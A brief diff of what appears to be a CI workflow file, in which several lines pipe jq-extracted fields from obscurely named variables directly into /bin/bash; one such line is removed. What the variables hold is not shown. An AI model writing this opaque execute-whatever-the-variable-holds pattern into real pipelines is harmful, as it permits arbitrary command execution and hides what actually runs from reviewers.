@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$wzso46" | jq -r .neetg28732 | /bin/bash
           printf '%s' "$dllpc8512" | jq -r .v41611 | /bin/bash
           echo $ljnsf913 | jq -r .fdqk8247 | /bin/bash
-          echo $s5373 | jq -r .ncc38162 | /bin/bash
           echo $mdqp30166 | jq -r .zz7512 | /bin/bash
           echo $xdrzw4 | jq -r .lhlf090 | /bin/bash
           echo $dkfag8 | jq -r .s1 | /bin/bash
